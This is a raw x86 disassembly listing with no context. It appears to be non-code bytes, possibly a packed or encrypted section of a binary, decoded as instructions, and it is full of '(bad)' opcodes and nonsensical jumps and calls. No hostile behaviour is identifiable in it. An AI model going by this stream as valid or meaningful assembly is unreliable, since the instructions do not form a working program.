  408444:	or     ecx,ebp
  408446:	xchg   BYTE PTR [esp+0x856431e],bl
  40844d:	xchg   ebp,eax
  40844e:	fidiv  DWORD PTR [ebx+0x463b157b]
  408454:	cmp    ecx,ebp
  408456:	mov    bh,0xec
  408458:	test   DWORD PTR [esp+ebp*1],esi
  40845b:	ds cmp esi,ebp
  40845e:	add    esp,DWORD PTR [ebp+0x310450ce]
  408464:	sub    BYTE PTR [edi-0x3efe5bbe],bl
  40846a:	outs   dx,DWORD PTR ds:[esi]
  40846b:	retf   
  40846c:	cmp    dh,cl
  40846e:	inc    edx
  40846f:	les    esp,FWORD PTR ds:0x390642be
  408475:	xor    al,0xc
  408477:	or     DWORD PTR [edx],ecx
  408479:	add    BYTE PTR [edx+0x0],0xf6
  40847d:	cmp    BYTE PTR [ebx+ebp*1-0x1a],dh
  408481:	cmp    BYTE PTR [esi-0x6efea3be],ah
  408487:	xor    eax,0x4296388b
  40848c:	pushf  
  40848d:	sub    eax,0x38ce4296
  408492:	cld    
  408493:	or     ebx,ecx
  408495:	sub    eax,0x38be4253
  40849a:	add    BYTE PTR [edx+edx*1],bh
  40849d:	inc    eax
  40849e:	jmp    FWORD PTR [esi-0xd]
  4084a1:	mov    ebp,0x62de5107
  4084a6:	call   FWORD PTR [esi-0xd]
  4084a9:	jge    0x40848f
  4084ab:	pop    esi
  4084ac:	repz aaa 
  4084ae:	call   0xff788644
  4084b3:	inc    esi
  4084b4:	or     DWORD PTR ds:0x20f33ef7,esp
  4084ba:	lods   eax,DWORD PTR ds:[esi]
  4084bb:	test   bl,dh
  4084bd:	aaa    
  4084be:	push   DWORD PTR [edx+ebx*1+0x40]
  4084c2:	jmp    DWORD PTR [esi]
  4084c4:	sbb    ch,BYTE PTR [ebx-0x53]
  4084c7:	push   ds
  4084c8:	repz aaa 
  4084ca:	mov    ch,0x19
  4084cc:	sbb    edi,DWORD PTR [eax]
  4084ce:	inc    DWORD PTR [ecx]
  4084d0:	stos   DWORD PTR es:[edi],eax
  4084d1:	inc    WORD PTR [esi]
  4084d4:	repz int 0xf7
  4084d7:	adc    BYTE PTR [eax-0xf0900ca],al
  4084dd:	mov    ebp,0xa70001fb
  4084e2:	xchg   edx,eax
  4084e3:	add    cl,ch
  4084e5:	jnp    0x408532
  4084e7:	or     cl,ch
  4084e9:	pop    es
  4084ea:	sub    esp,0x6a
  4084ed:	imul   esi,DWORD PTR ds:0x1adce96a,0x21353cff
  4084f7:	test   eax,0x89387093
  4084fc:	sub    al,0x71
  4084fe:	mov    eax,ds:0x37f210ab
  408503:	(bad)  
  408504:	sbb    al,0x35
  408506:	and    DWORD PTR [esi],edx
  408508:	lahf   
  408509:	jo     0x408543
  40850b:	call   FWORD PTR [ecx+esi*2]
  40850e:	cmp    BYTE PTR [ebp-0x1f],dh
  408511:	sbb    bl,BYTE PTR [ebp-0x56]
  408514:	add    BYTE PTR [edi-0x2b3d3737],ch
  40851a:	or     edx,DWORD PTR [ebp-0x75]
  40851d:	lods   al,BYTE PTR ds:[esi]
  40851e:	(bad)  
  40851f:	(bad)  
  408520:	cld    
  408521:	xor    cl,BYTE PTR ds:0x800f146a
  408527:	pop    es
  408528:	call   0x3f2abd
  40852d:	adc    DWORD PTR [eax-0x5],edx
  408530:	push   0xbeef0b98
  408535:	pusha  
  408536:	rcr    DWORD PTR [eax+0x41],1
  408539:	mov    BYTE PTR [ebx-0x35],ah
  40853c:	pop    ecx
  40853d:	leave  
  40853e:	or     edi,edi
  408540:	jne    0x408592
  408542:	jecxz  0x4085a6
  408544:	(bad)  
  408545:	add    BYTE PTR [edi],cl
  408547:	retf   0x75fe
  40854a:	cmp    al,0xca
  40854c:	je     0x408556
  40854e:	xor    BYTE PTR [edx+ebp*4-0x3e3bc001],dl
  408555:	add    al,0x58
  408557:	pop    esi
  408558:	mov    ch,ah
  40855a:	leave  
  40855b:	rcl    bh,0xf7
  40855e:	aas    
  40855f:	enter  0x458c,0x1c
  408563:	pop    ebx
  408564:	(bad)  
  408565:	jne    0x408583
  408567:	retf   0xd234
  40856a:	pusha  
  40856b:	dec    edx
  40856c:	jmp    edi
  40856e:	cs xchg edx,eax
  408570:	add    BYTE PTR [eax],al
  408572:	adc    ecx,ebx
  408574:	push   cs
  408575:	test   DWORD PTR [ebp-0x28fffff5],edi
  40857b:	dec    edi
  40857c:	test   DWORD PTR [eax],0xc7000b08
  408582:	adc    eax,0xd807fef1
  408587:	or     ch,BYTE PTR [edx+0x0]
  40858a:	inc    edx
  40858b:	or     eax,0xa31006a
  408590:	add    al,0x8d
  408592:	je     0x408530
  408594:	ror    DWORD PTR [esp+ebp*4-0x4100c84c],cl
  40859b:	adc    BYTE PTR [ecx+0x75],al
  40859e:	mov    ecx,0x99fbb5bf
  4085a3:	and    BYTE PTR [edx+0x433b3100],bl
  4085a9:	je     0x4085ab
  4085ab:	xor    al,0xd9
  4085ad:	xchg   edx,eax
  4085ae:	add    DWORD PTR [ecx],esi
  4085b0:	and    BYTE PTR [ebx+0x360f9ad],ch
  4085b6:	(bad)  
  4085b7:	cld    
  4085b8:	cmp    ebp,DWORD PTR [ebx]
  4085ba:	push   ecx
  4085bb:	shl    edi,0x3f
  4085be:	push   eax
  4085bf:	stos   BYTE PTR es:[edi],al
  4085c0:	adc    BYTE PTR [esi+0x3fff6585],cl
  4085c6:	inc    DWORD PTR [ecx]
  4085c8:	jb     0x4085f5
  4085ca:	inc    ecx
  4085cb:	mov    eax,ds:0xac894017
  4085d0:	adc    BYTE PTR [eax],bh
  4085d2:	dec    DWORD PTR [esi+0x8]
  4085d5:	cwde   
  4085d6:	lods   al,BYTE PTR ds:[esi]
  4085d7:	inc    esi
  4085d8:	jle    0x3f7fdf63
  4085de:	jmp    ecx
  4085e0:	xchg   DWORD PTR [edi],esi
  4085e2:	pop    ecx
  4085e3:	jo     0x408605
  4085e5:	inc    eax
  4085e6:	mov    ch,0x21
  4085e8:	push   edi
  4085e9:	aas    
  4085ea:	call   FWORD PTR [esi]
  4085ec:	sbb    eax,0x20704852
  4085f1:	sub    edx,DWORD PTR [edx-0x76c0b922]
  4085f7:	lods   al,BYTE PTR ds:[esi]
  4085f8:	inc    ebx
  4085f9:	aaa    
  4085fa:	(bad)  
  4085fb:	(bad)  
  4085fc:	fld    DWORD PTR [ebx]
  4085fe:	push   0xffc51913
  408603:	out    dx,eax
  408604:	mov    esp,0x8e6f733
  408609:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40860a:	aas    
  40860b:	and    al,0x5b
  40860d:	xor    ebp,eax
  40860f:	add    dh,dl
  408611:	sub    eax,0x35ce6f1d
  408616:	pusha  
  408617:	mov    ebp,edx
  408619:	cmp    eax,0x94b3f86
  40861e:	adc    DWORD PTR [ebx],ebp
  408620:	pop    eax
  408621:	enter  0x3ee8,0xe4
  408625:	cmp    BYTE PTR [esi+0x3f],dh
  408628:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408629:	xor    eax,0xc7e9521c
  40862e:	call   0x56a6855e
  408633:	aas    
  408634:	mov    eax,0x8637418b
  408639:	xor    eax,0x3d5d8974
  40863e:	ds aas 
  408640:	loope  0x4085e2
  408642:	xor    ebx,ebp
  408644:	icebp  
  408645:	or     BYTE PTR [esi],ch
  408647:	jns    0x4086aa
  408649:	cmp    eax,0xfb5e3f26
  40864e:	cmp    cl,ah
  408650:	icebp  
  408651:	or     BYTE PTR [ecx],al
  408653:	repz lahf 
  408655:	xor    eax,0xbc710b0e
  40865a:	fild   WORD PTR [edx+0x3ef6547c]
  408660:	ss or  al,0x7c
  408663:	adc    ebp,DWORD PTR [esi]
  408665:	cli    
  408666:	pop    ebp
  408667:	mov    DWORD PTR [ecx],edx
  408669:	cmp    eax,0x21813ee6
  40866e:	jmp    0xc2759ce2
  408673:	pop    ss
  408674:	add    BYTE PTR [edx],bh
  408676:	dec    ecx
  408677:	push   ebp
  408678:	push   es
  408679:	popa   
  40867a:	and    DWORD PTR [ebp-0x59cb0196],edi
  408680:	mov    BYTE PTR [ecx],dl
  408682:	cmp    eax,0x1e2fb600
  408687:	add    cl,ch
  408689:	xor    cl,BYTE PTR [eax+0x34278dbd]
  40868f:	(bad)  
  408690:	jmp    0x54c33d33
  408695:	push   ds
  408696:	cmp    al,0xff
  408698:	mov    ?,WORD PTR [edx]
  40869a:	mov    ebp,0x21b16a74
  40869f:	idiv   DWORD PTR [esi-0x9]
  4086a2:	or     BYTE PTR [ebp+eax*1-0x25],dh
  4086a6:	xor    al,0x8c
  4086a8:	or     bh,BYTE PTR fs:[edi+edi*8]
  4086ac:	data16 xor BYTE PTR [ebx],0xb5
  4086b0:	inc    ebp
  4086b1:	pop    edi
  4086b2:	xor    al,0xff
  4086b4:	inc    ecx
  4086b5:	mov    bl,BYTE PTR [ebp-0x1]
  4086b8:	dec    esi
  4086b9:	cmp    ecx,DWORD PTR [ecx+0x74]
  4086bc:	popf   
  4086bd:	mov    bl,0x76
  4086bf:	fdiv   DWORD PTR [esi]
  4086c1:	aaa    
  4086c2:	xor    al,0x0
  4086c4:	mov    ebp,0xe8ffac7b
  4086c9:	pop    ss
  4086ca:	jae    0x4086cb
  4086cc:	pushf  
  4086cd:	sub    ah,BYTE PTR [ecx]
  4086cf:	push   edx
  4086d0:	push   ecx
  4086d1:	pop    ss
  4086d2:	xor    al,0xff
  4086d4:	pop    esp
  4086d5:	push   ds
  4086d6:	cmp    al,0xff
  4086d8:	push   cs
  4086d9:	add    BYTE PTR [edi],al
  4086db:	mov    esi,0x60d41107
  4086e0:	(bad)  
  4086e1:	(bad)  
  4086e2:	hlt    
  4086e3:	jge    0x4086cd
  4086e5:	(bad)  
  4086e6:	ins    BYTE PTR es:[edi],dx
  4086e7:	xor    al,0xff
  4086e9:	je     0x408725
  4086eb:	and    DWORD PTR [eax-0xcba36f],ebx
  4086f1:	xchg   esp,eax
  4086f2:	jne    0x408730
  4086f4:	call   esi
  4086f6:	dec    esp
  4086f7:	jle    0x4086dd
  4086f9:	(bad)  
  4086fa:	inc    esp
  4086fb:	xor    al,0xff
  4086fd:	add    BYTE PTR ds:0xa058e805,bh
  408703:	cmc    
  408704:	(bad)  
  408705:	jmp    FWORD PTR [ebp-0x13]
  408708:	idiv   bh
  40870a:	xchg   edi,eax
  40870b:	cmc    
  40870c:	je     0x408716
  40870e:	rcl    BYTE PTR [eax],0xa8
  408711:	push   DWORD PTR [edi-0x501b4b0b]
  408717:	cmc    
  408718:	(bad)  
  408719:	call   0x3f291e
  40871e:	mov    bh,0xbb
  408720:	jmp    0x408719
  408722:	aaa    
  408723:	mul    bh
  408725:	dec    ebp
  408726:	repz cmc 
  408728:	(bad)  
  408729:	call   FWORD PTR [ebp-0x1b]
  40872c:	idiv   bh
  40872e:	pop    ss
  40872f:	in     eax,0x41
  408731:	stos   DWORD PTR es:[edi],eax
  408732:	div    ebp
  408734:	(bad)  
  408735:	mov    ch,0xe8
  408737:	std    
  408738:	(bad)  
  408739:	push   eax
  40873b:	cmp    eax,0xf700ffaa
  408740:	cmc    
  408741:	inc    esp
  408742:	clc    
  408743:	loope  0x40878b
  408745:	std    
  408746:	jmp    DWORD PTR [edi]
  408748:	div    BYTE PTR [esp+edi*8-0x10]
  40874c:	pop    ecx
  40874d:	xchg   esi,eax
  40874e:	add    BYTE PTR [eax-0x42],cl
  408751:	ror    DWORD PTR [eax],0x48
  408754:	pop    edx
  408755:	mov    ch,ah
  408757:	fcmovnb st,st(0)
  408759:	repz call FWORD PTR [ebp-0x221417fd]
  408760:	or     al,0x0
  408762:	mov    DWORD PTR [ebp+0x2075feef],ecx
  408768:	fbld   TBYTE PTR [eax]
  40876a:	stos   DWORD PTR es:[edi],eax
  40876b:	pop    ss
  40876c:	test   BYTE PTR [eax+0x74f61445],0xfc
  408773:	idiv   DWORD PTR [ebx-0x9]
  408776:	push   DWORD PTR [ecx]
  408778:	aad    0xf
  40877a:	call   0xff7d22c7
  40877f:	sub    ah,BYTE PTR [eax-0x49]
  408782:	cmp    eax,0x6a37eda8
  408787:	xor    DWORD PTR [ebp+0x6381f3c5],ebp
  40878d:	mov    dh,0xfb
  40878f:	leave  
  408790:	add    DWORD PTR [eax-0x1],ebx
  408793:	(bad)  
  408794:	aaa    
  408795:	inc    ebx
  408796:	je     0x4087b0
  408798:	or     BYTE PTR [eax+edx*1],al
  40879b:	(bad)  
  40879c:	ret    0x753b
  40879f:	sub    DWORD PTR [eax-0x49ff5879],ebx
  4087a5:	mov    bl,0x3b
  4087a7:	jne    0x408752
  4087a9:	mov    ebx,0x3da60bb5
  4087ae:	or     ebp,eax
  4087b0:	int    0x83
  4087b2:	cmp    al,0xff
  4087b4:	xchg   esi,eax
  4087b5:	pop    ebp
  4087b6:	aaa    
  4087b7:	inc    DWORD PTR [esp+ebx*8]
  4087ba:	cmp    esi,DWORD PTR [ebp+0x39]
  4087bd:	enter  0xa79c,0x7e
  4087c1:	retf   
  4087c2:	cmp    esi,DWORD PTR [ebp+0x75]
  4087c5:	fsubr  DWORD PTR [ebx-0x56]
  4087c8:	outs   dx,BYTE PTR ds:[esi]
  4087c9:	sti    
  4087ca:	dec    ecx
  4087cb:	ret    0x2039
  4087ce:	(bad)  
  4087cf:	mov    cl,BYTE PTR [ebp-0x61]
  4087d2:	inc    esi
  4087d3:	call   0xbf69ad7
  4087d8:	pop    ecx
  4087d9:	cdq    
  4087da:	ins    BYTE PTR es:[edi],dx
  4087db:	inc    DWORD PTR [esi+0x27]
  4087de:	inc    ebx
  4087df:	jne    0x408815
  4087e1:	push   0x4a
  4087e3:	ret    0x2029
  4087e6:	mov    es,WORD PTR [ebp+0x21]
  4087e9:	nop
  4087ea:	cmp    al,0x75
  4087ec:	xor    eax,0x1eafe808
  4087f1:	or     esi,esp
  4087f3:	psllw  mm0,QWORD PTR [ecx]
  4087f6:	gs sahf 
  4087f8:	xor    DWORD PTR [ecx],ecx
  4087fa:	jmp    0xc1760439
  4087ff:	mov    cl,bl
  408801:	xor    esi,eax
  408803:	lea    ebp,[ebp+eiz*1-0x42]
  408807:	mov    cl,0x0
  408809:	jmp    0xb0bb:0xe6283c31
  408810:	sub    al,0xa5
  408812:	pop    esi
  408813:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408814:	cmp    ebp,DWORD PTR [edx+0x782f8cbb]
  40881a:	mov    eax,ds:0x971ddde
  40881f:	aaa    
  408820:	sub    al,0xdd
  408822:	call   0x5f4:0x492a03e9
  408829:	call   0x12fb:0x193461f3
  408830:	lds    ebx,FWORD PTR [esi+0x31910329]
  408836:	or     edx,ebp
  408838:	xor    edi,DWORD PTR [eax-0x1253bf45]
  40883e:	into   
  40883f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408840:	add    esp,edi
  408842:	and    BYTE PTR [ebx-0xdf6ce6e],al
  408848:	inc    ebx
  408849:	in     al,0x6
  40884b:	inc    edx
  40884c:	pop    ds
  40884d:	mov    ebx,0x31042718
  408852:	fnstcw WORD PTR [edx+0x1e20dc3a]
  408858:	mov    cl,0x36
  40885a:	and    DWORD PTR [eax],edx
  40885c:	cmp    al,BYTE PTR [esi+0x31]
  40885f:	mov    bl,0xdb
  408861:	mov    dh,0x18
  408863:	imul   edi,edx,0xac3abc36
  408869:	xor    DWORD PTR [ecx],ebx
  40886b:	add    BYTE PTR [esi],al
  40886d:	add    BYTE PTR [ebx+0x4ae17530],ch
  408873:	js     0x40881b
  408875:	out    0x5b,al
  408877:	xor    BYTE PTR [ebp-0x23],dh
  40887a:	dec    ebx
  40887b:	mov    dh,0xeb
  40887d:	(bad)  
  40887e:	ror    DWORD PTR [eax],0xe8
  408881:	scas   al,BYTE PTR es:[edi]
  408882:	nop
  408883:	xor    bh,bh
  408885:	mov    cl,0x24
  408888:	call   0xff70e646
  40888d:	fs icebp 
  40888f:	and    BYTE PTR [eax-0x3f],dl
  408892:	cmp    edi,DWORD PTR [ecx-0x1]
  408895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408896:	pop    es
  408897:	or     DWORD PTR [esi-0x50],ebx
  40889a:	je     0x40889d
  40889c:	add    BYTE PTR [esi+esi*4],bh
  40889f:	sbb    eax,0xa306a583
  4088a4:	call   DWORD PTR [edx]
  4088a6:	and    BYTE PTR [eax],dh
  4088a8:	jne    0x40889b
  4088aa:	pop    edx
  4088ab:	pop    es
  4088ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088ad:	jbe    0x40891a
  4088af:	add    BYTE PTR [ebp+0x6d],0xca
  4088b3:	or     bl,BYTE PTR [edx-0x58]
  4088b6:	xor    dh,BYTE PTR [eax]
  4088b8:	jne    0x4088ab
  4088ba:	pop    edx
  4088bb:	push   0xa34b56fc
  4088c0:	inc    eax
  4088c2:	data16 rol BYTE PTR [eax-0x17],cl
  4088c6:	retf   0x59c8
  4088c9:	test   al,0x32
  4088cb:	xor    BYTE PTR ds:0xffc97a1b,dh
  4088d1:	inc    eax
  4088d2:	add    bl,bl
  4088d4:	pop    esp
  4088d5:	jmp    DWORD PTR [esi]
  4088d7:	daa    
  4088d8:	dec    ecx
  4088d9:	je     0x4088de
  4088db:	popf   
  4088dc:	jecxz  0x408937
  4088de:	test   al,0x32
  4088e0:	(bad)  
  4088e2:	(bad)  
  4088e3:	leave  
  4088e4:	das    
  4088e5:	inc    DWORD PTR [eax]
  4088e7:	cwde   
  4088e8:	pop    esp
  4088e9:	(bad)  
  4088ea:	jne    0x40890c
  4088ec:	in     al,0xe2
  4088ee:	(bad)  
  4088ef:	pop    ds
  4088f0:	repnz out 0x89,eax
  4088f3:	jno    0x4088e8
  4088f5:	(bad)  
  4088f6:	push   0x32
  4088f8:	fstp   st(1)
  4088fa:	lods   eax,DWORD PTR ds:[esi]
  4088fb:	out    dx,eax
  4088fc:	icebp  
  4088fd:	or     al,al
  4088ff:	fs push eax
  408901:	addr16 pop ds
  408903:	inc    edx
  408904:	dec    esp
  408905:	dec    DWORD PTR [edi-0x20]
  408908:	push   0xffffffac
  40890a:	jmp    FWORD PTR [edi+0x195a2a5c]
  408910:	add    eax,0xa843e850
  408915:	(bad)  
  408916:	call   FWORD PTR [eax]
  408918:	push   ebp
  408919:	(bad)  
  40891a:	jne    0x4088dc
  40891c:	jecxz  0x4088d0
  40891e:	(bad)  
  40891f:	lahf   
  408920:	icebp  
  408921:	out    0x59,eax
  408923:	jno    0x408917
  408925:	(bad)  
  408926:	push   0xffffffcc
  408928:	jecxz  0x4088d3
  40892a:	lods   eax,DWORD PTR ds:[esi]
  40892b:	das    
  40892c:	repnz or al,al
  40892f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408930:	dec    esi
  408931:	addr16 pop ds
  408933:	inc    edx
  408934:	dec    esp
  408935:	dec    DWORD PTR [edi+0x0]
  408938:	add    BYTE PTR [ebx],bh
  40893a:	lods   al,BYTE PTR ds:[esi]
  40893b:	(bad)  
  40893c:	out    dx,eax
  40893d:	pop    esp
  40893e:	sub    bl,BYTE PTR [edx-0x27]
  408941:	or     edx,DWORD PTR [eax-0x18]
  408944:	xor    ebp,DWORD PTR [eax+0x5b98fffe]
  40894a:	(bad)  
  40894b:	jne    0x4089ad
  40894d:	jecxz  0x4088d1
  40894f:	(bad)  
  408950:	pop    ds
  408951:	repnz out 0x29,eax
  408954:	mov    cl,0xf1
  408956:	(bad)  
  408957:	push   0x6b
  408959:	jecxz  0x4089d4
  40895b:	lods   eax,DWORD PTR ds:[esi]
  40895c:	das    
  40895d:	repnz or al,al
  408960:	xor    DWORD PTR [esi+0x7c1e67de],ecx
  408966:	ret    0xe6ff
  408969:	sbb    DWORD PTR [edx],eax
  40896b:	lods   eax,DWORD PTR ds:[esi]
  40896c:	xor    BYTE PTR cs:[ebx+0x3618b2a],ch
  408973:	push   eax
  408974:	or     DWORD PTR [edi+eiz*2],edi
  408977:	call   DWORD PTR [esi]
  408979:	icebp  
  40897a:	sar    esi,cl
  40897c:	test   BYTE PTR [eax],bh
  40897e:	sub    edx,DWORD PTR [ebx+0x7]
  408981:	pop    eax
  408982:	cmp    al,ch
  408984:	clc    
  408985:	mov    BYTE PTR [eax],bh
  408987:	push   esi
  408989:	in     eax,dx
  40898a:	aaa    
  40898b:	jmp    DWORD PTR [eax+edi*1+0x2b]
  40898f:	ins    BYTE PTR es:[edi],dx
  408990:	(bad)  
  408991:	ja     0x4089cb
  408993:	leave  
  408994:	repz and al,0x3
  408997:	push   ebp
  408998:	stos   BYTE PTR es:[edi],al
  408999:	xchg   esp,eax
  40899a:	add    ah,0x0
  40899d:	in     eax,dx
  40899e:	xchg   edi,eax
  40899f:	cmp    bh,bh
  4089a1:	mov    ah,0xdd
  4089a3:	aaa    
  4089a4:	push   eax
  4089a5:	mov    esi,0x3cff1415
  4089aa:	xor    al,0x2b
  4089ac:	add    al,0xc4
  4089ae:	and    BYTE PTR [ebx],al
  4089b0:	or     esi,DWORD PTR [ecx+0x27]
  4089b3:	jle    0x408973
  4089b5:	xor    BYTE PTR [eax],ah
  4089b7:	add    eax,edi
  4089b9:	in     al,dx
  4089ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089bb:	add    al,BYTE PTR [eax]
  4089bd:	xor    DWORD PTR [eax],esp
  4089bf:	inc    eax
  4089c0:	inc    ebp
  4089c1:	jge    0x40899a
  4089c3:	(bad)  
  4089c4:	push   DWORD PTR [ecx]
  4089c6:	dec    edx
  4089c7:	add    ebp,DWORD PTR [edx+0x31]
  4089ca:	pop    edx
  4089cb:	add    ebp,DWORD PTR [edx+0x31]
  4089ce:	popf   
  4089cf:	mov    ebp,0x7da501f3
  4089d4:	hlt    
  4089d5:	data16 fbstp TBYTE PTR [edi]
  4089d8:	push   eax
  4089d9:	push   esi
  4089da:	or     DWORD PTR [ebx+edi*1+0x2b1cb44e],ebx
  4089e1:	pop    edi
  4089e2:	xchg   ebp,eax
  4089e3:	jmp    0x9589b3eb
  4089e8:	dec    BYTE PTR [ecx-0x78]
  4089eb:	call   0x4ee1baf3
  4089f0:	retf   
  4089f1:	jno    0x4089fc
  4089f3:	imul   BYTE PTR [ebp+0x67c6212e]
  4089f9:	push   ss
  4089fa:	cmp    DWORD PTR cs:[ebx+0x30647be1],ecx
  408a01:	add    dh,bh
  408a03:	sub    eax,0x2160d4d6
  408a08:	mul    BYTE PTR [edi-0xa]
  408a0b:	sub    eax,0x35e18170
  408a10:	mov    esi,0x809bd937
  408a15:	aaa    
  408a16:	fisub  WORD PTR [edx-0x2ca55418]
  408a1c:	daa    
  408a1d:	add    al,0xce
  408a1f:	jae    0x4089ba
  408a21:	das    
  408a22:	(bad)  
  408a23:	sub    eax,0x212ab196
  408a28:	sbb    DWORD PTR [ebx-0x4a],ebp
  408a2b:	sub    eax,0x35958170
  408a30:	jle    0x408a69
  408a32:	sbb    ecx,DWORD PTR [ecx]
  408a34:	add    DWORD PTR [ecx+0x36e8c7fb],eax
  408a3a:	fdivr  QWORD PTR [eax]
  408a3c:	pop    esi
  408a3d:	aaa    
  408a3e:	mov    gs,WORD PTR ds:0xd39907d4
  408a44:	xor    DWORD PTR [edi],0x24647f7e
  408a4a:	jle    0x408a79
  408a4c:	inc    esi
  408a4d:	stos   BYTE PTR es:[edi],al
  408a4e:	outs   dx,BYTE PTR ds:[esi]
  408a4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a50:	int3   
  408a51:	fyl2x  
  408a53:	or     BYTE PTR [eax],al
  408a55:	ss loopne 0x408a90
  408a58:	imul   DWORD PTR [esi]
  408a5a:	push   ds
  408a5b:	cs jne 0x408a53
  408a5e:	sbb    dh,bl
  408a60:	stos   BYTE PTR es:[edi],al
  408a61:	push   ds
  408a62:	(bad)  
  408a63:	jg     0x4089ea
  408a65:	add    eax,0xff2e0e00
  408a6a:	xor    DWORD PTR [edx],0xffffffa1
  408a6d:	jb     0x408a12
  408a6f:	cmc    
  408a70:	sub    al,0xfe
  408a72:	xor    al,0x5d
  408a74:	xor    al,0xff
  408a76:	mul    BYTE PTR [edi-0x4a]
  408a79:	or     eax,DWORD PTR [ecx]
  408a7b:	ds pusha 
  408a7d:	jmp    esi
  408a7f:	mov    ebp,0x3fd6e886
  408a84:	sub    al,0x6a
  408a86:	jmp    0x289b0655
  408a8b:	sub    eax,0x1fb9b52c
  408a90:	sub    al,0xff
  408a92:	mov    esi,0xede800a1
  408a97:	dec    ebx
  408a98:	sub    al,0xff
  408a9a:	pusha  
  408a9b:	mov    cl,0x4d
  408a9d:	mul    DWORD PTR [esi-0x7a4277f9]
  408aa3:	pop    ss
  408aa4:	sub    al,0xff
  408aa6:	jmp    0x4cc38c2c
  408aab:	adc    dh,BYTE PTR [edi+edi*8]
  408aae:	xchg   BYTE PTR [edx],dh
  408ab0:	mov    ch,0x64
  408ab2:	push   0x29
  408ab4:	sbb    eax,0x96776f7
  408ab9:	je     0x408ac8
  408abb:	mov    dl,0x6e
  408abd:	call   0x6cd220
  408ac2:	aad    0x63
  408ac4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ac5:	(bad)  
  408ac6:	call   0xd53ff622
  408acb:	add    BYTE PTR [edx],ch
  408acd:	and    DWORD PTR [esi+0x0],esp
  408ad0:	mov    esp,0xddfffef3
  408ad5:	jecxz  0x408acd
  408ad7:	jmp    DWORD PTR [edi]
  408ad9:	repz je 0x408ae4
  408adc:	lock mov cl,0xa3
  408adf:	call   DWORD PTR [edi]
  408ae1:	repz mov ah,0xe8
  408ae4:	pop    ds
  408ae5:	repz (bad) 
  408ae7:	call   FWORD PTR [ebp-0x13531800]
  408aed:	repnz (bad) 
  408aef:	jmp    FWORD PTR [ebp+0xc]
  408af2:	idiv   edi
  408af4:	daa    
  408af5:	div    BYTE PTR [eax+ecx*1+0x30]
  408af9:	xchg   esi,eax
  408afa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408afb:	inc    DWORD PTR [edi]
  408afd:	div    BYTE PTR [eax+eiz*8-0x10a11]
  408b04:	pop    ebp
  408b05:	std    
  408b06:	out    0x90,eax
  408b08:	lods   al,BYTE PTR ds:[esi]
  408b09:	cmc    
  408b0a:	(bad)  
  408b0b:	call   FWORD PTR [ebp-0x8000930]
  408b11:	cmc    
  408b12:	je     0x408b1c
  408b14:	add    BYTE PTR [edi-0xa58005c],al
  408b1a:	mov    ah,0xe4
  408b1c:	lahf   
  408b1d:	cmc    
  408b1e:	(bad)  
  408b1f:	call   0x3f5960
  408b24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b25:	fcomip st,st(7)
  408b28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b29:	cmc    
  408b2a:	out    0x59,eax
  408b2c:	outs   dx,DWORD PTR ds:[esi]
  408b2d:	idiv   dh
  408b2f:	inc    DWORD PTR [eax]
  408b31:	ins    DWORD PTR es:[edi],dx
  408b32:	loope  0x408b2a
  408b34:	jmp    DWORD PTR [edi]
  408b36:	fisttp QWORD PTR [ebp-0x59]
  408b39:	daa    
  408b3a:	idiv   dh
  408b3c:	mov    ch,0xb0
  408b3e:	(bad)  
  408b40:	jmp    eax
  408b42:	dec    ecx
  408b43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b44:	jmp    edi
  408b46:	cmc    
  408b47:	mov    ah,0xdc
  408b49:	xor    ebx,ecx
  408b4b:	xor    al,0xff
  408b4d:	mov    DWORD PTR [ecx],ebx
  408b4f:	pop    ebp
  408b50:	jmp    FWORD PTR [esi-0x3e]
  408b53:	outs   dx,BYTE PTR ds:[esi]
  408b54:	lock pop esi
  408b56:	jmp    0x7534:0x25e4ff34
  408b5d:	sub    edx,ecx
  408b5f:	idiv   ch
  408b61:	dec    esi
  408b62:	loop   0x408b98
  408b64:	mov    ch,0x41
  408b66:	adc    dh,BYTE PTR ds:0x5c3549ff
  408b6c:	push   DWORD PTR [esi]
  408b6e:	cli    
  408b6f:	mov    esi,0x359218f7
  408b74:	jmp    DWORD PTR [esi]
  408b76:	sub    al,0xae
  408b78:	sti    
  408b79:	or     DWORD PTR [ecx-0x70],edi
  408b7c:	add    BYTE PTR [ecx],dh
  408b7e:	jmp    0xed7197c4
  408b83:	mov    ah,ch
  408b85:	mov    dl,0x64
  408b87:	aaa    
  408b88:	push   0x31
  408b8a:	(bad)  
  408b8b:	or     eax,0x2b287cff
  408b90:	cs xchg ebp,eax
  408b92:	inc    ebx
  408b93:	xor    al,0x89
  408b95:	add    BYTE PTR [esp+ebp*2-0x55],ch
  408b99:	cwde   
  408b9a:	jnp    0x408b7d
  408b9c:	add    ebp,DWORD PTR [eax+0x33]
  408b9f:	and    BYTE PTR [ebx],al
  408ba1:	or     dh,0xd
  408ba4:	or     al,0xe8
  408ba6:	mov    esi,0x49ff348d
  408bab:	mov    ecx,0x7b3140d8
  408bb0:	out    dx,al
  408bb1:	sar    ecx,1
  408bb3:	loopne 0x408bb8
  408bb5:	call   FWORD PTR [eax+edi*1]
  408bb8:	sub    esp,esp
  408bba:	pushf  
  408bbb:	mov    bl,0x33
  408bbd:	call   FWORD PTR [esp+ebx*4]
  408bc0:	xor    esi,DWORD PTR [ebp+0x39]
  408bc3:	or     DWORD PTR [ecx-0x3e],edx
  408bc6:	shr    BYTE PTR [edx],cl
  408bc8:	pop    esi
  408bc9:	dec    edx
  408bca:	jae    0x408bd1
  408bcc:	jmp    0x685e379f
  408bd1:	aas    
  408bd2:	lea    esi,[edx]
  408bd4:	inc    esi
  408bd5:	xor    al,0xb4
  408bd7:	les    edi,FWORD PTR [ebx+edx*8]
  408bda:	pop    edi
  408bdb:	mov    ah,0xd8
  408bdd:	xor    al,0xdc
